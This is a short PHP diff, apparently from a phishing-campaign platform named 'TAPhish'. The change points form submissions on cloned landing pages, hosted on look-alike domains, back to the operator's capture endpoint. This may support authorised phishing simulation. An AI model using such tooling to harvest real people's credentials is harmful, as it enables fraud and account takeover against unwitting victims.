@@ -396,7 +396,12 @@ if (isset($_POST)) {
 			} elseif ($slug === '' || !is_dir($dir)) {
 				echo json_encode(['result' => 'failed', 'error' => 'Cloned landing not found for slug.']);
 			} else {
-				$r = landing_host_push_dir($cfg, $slug, $dir);
+				// Render {{POST_URL}} to THIS TAPhish host's capture endpoint at
+				// push time (idempotent on already-baked clones; fixes residual
+				// placeholders). The landing lives on the look-alike host, but the
+				// capture POST must target the app host the operator is on.
+				$postUrl = 'https://' . ((string)($_SERVER['HTTP_HOST'] ?? 'deepaudit.ch')) . '/track.php';
+				$r = landing_host_push_dir($cfg, $slug, $dir, null, $postUrl);
 				if (!empty($r['ok'])) {
 					landing_host_save($conn, landing_host_stamp_push($cfg, $slug, (string)$r['public_url'], (int)$r['uploaded'], gmdate('Y-m-d\TH:i:s\Z'))); // P3 push status
 					logIt('landing pushed to external host: ' . $slug . ' -> ' . $r['public_url'] . ' (' . $r['uploaded'] . ' files)');
